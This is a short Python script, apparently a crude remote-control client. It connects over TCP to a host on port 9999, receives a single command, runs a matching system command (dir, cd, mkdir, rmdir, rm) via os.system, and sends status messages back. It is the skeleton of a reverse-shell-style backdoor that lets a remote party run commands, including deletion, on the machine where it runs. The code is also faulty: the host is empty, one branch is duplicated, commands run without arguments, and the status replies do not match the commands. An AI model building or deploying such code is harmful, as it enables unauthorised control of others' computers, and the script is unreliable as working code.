import time
import socket
import sys
import os

# Create a TCP/IP socket
s = socket.socket()
host = ""
port = 9999
s.connect((host, port))
# Send data
print("Connected to server")
command = s.recv(1024)
command = command.decode()
print("Command: " + command)

#List of commands
# Check if the command is valid
if command == "dir":
    print("Command is dir")
    # Send the command to the server
    s.send("Command received".encode())
    os.system("dir")
    s.send("ls done".encode())
elif command == "cd":
    print("Command is cd")
    # Send the command to the server
    s.send("Command received".encode())
    os.system("cd")
    s.send("pwd done".encode())
elif command == "cd":
    print("Command is cd")
    # Send the command to the server
    s.send("Command received".encode())
    os.system("cd")
    s.send("cd done".encode())
elif command == "mkdir":
    print("Command is mkdir")
    # Send the command to the server
    s.send("Command received".encode())
    os.system("mkdir")
    s.send("mkdir done".encode())
elif command == "rmdir":
    print("Command is rmdir")
    # Send the command to the server
    s.send("Command received".encode())
    os.system("rmdir")
    s.send("rmdir done".encode())
elif command == "rm":
    print("Command is rm")
    # Send the command to the server
    s.send("Command received".encode())
    os.system("rm")
    s.send("rm done".encode())
elif command == "exit":
    print("Command is exit")
    # Send the command to the server
    s.send("Command received".encode())
    print("Bye")
    sys.exit()
else:
    print("Command is invalid")
    # Send the command to the server
    s.send("Command received".encode())
    print("Bye")
    sys.exit()
